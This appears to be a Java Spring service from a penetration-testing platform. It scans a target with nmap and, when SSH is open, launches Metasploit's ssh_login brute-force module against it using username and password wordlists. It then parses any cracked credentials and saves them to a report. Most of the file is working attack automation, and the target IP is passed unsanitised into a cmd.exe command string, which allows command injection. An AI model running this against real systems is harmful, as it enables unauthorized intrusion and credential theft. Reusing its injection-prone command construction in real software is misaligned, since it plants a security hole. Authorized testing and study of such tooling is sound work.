package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.penforge.backend.pentestRecon.PentestReconService;
import org.penforge.backend.pentestReport.Credentials;
import org.penforge.backend.pentestReport.PentestReport;
import org.penforge.backend.pentestReport.PentestReportRepository;
import org.penforge.backend.pentestReport.PortData;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
@AllArgsConstructor
public class SshBruteForceService {

    private final PentestReconService pentestReconService;
    private final PentestReportRepository pentestReportRepository;

    public void isPortOpen(String targetIp, String userId) throws Exception {
        List<PortData> portDataList = pentestReconService.runNmap(targetIp);
        boolean isSshPortOpen = portDataList.stream().anyMatch(portData -> portData.getPort().equals("22/tcp") && portData.getPortState().equals("open"));

        if (isSshPortOpen) {
            performSshBruteForce(targetIp, userId, portDataList);
        }
    }

    public void performSshBruteForce(String targetIp, String userId, List<PortData> portDataList) {
        List<Credentials> credentialList = new ArrayList<>();
        String usernamesPath = "/home/order6tyfix/usernames.txt";
        String passwordsPath = "/home/order6tyfix/passwords.txt";

        String command = String.format(
                "wsl msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS %s; set USER_FILE %s; set PASS_FILE %s; exploit; exit -y\"",
                targetIp, usernamesPath, passwordsPath
        );

        ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", command);
        processBuilder.redirectErrorStream(true);

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(processBuilder.start().getInputStream()))) {
            String line;
            Pattern pattern = Pattern.compile("Success: '([^:]+):([^']+)'");

            while ((line = reader.readLine()) != null) {
                System.out.println(line); // Debugging output

                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    credentialList.add(Credentials.builder()
                            .username(matcher.group(1))
                            .password(matcher.group(2))
                            .build());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        PentestReport report = PentestReport.builder()
                .userId(userId)
                .id(UUID.randomUUID().toString())
                .targetIP(targetIp)
                .targetService("ssh")
                .targetPort(22)
                .scanDate(new Date())
                .credentials(credentialList)
                .portData(portDataList)
                .build();

        pentestReportRepository.save(report);
    }
}
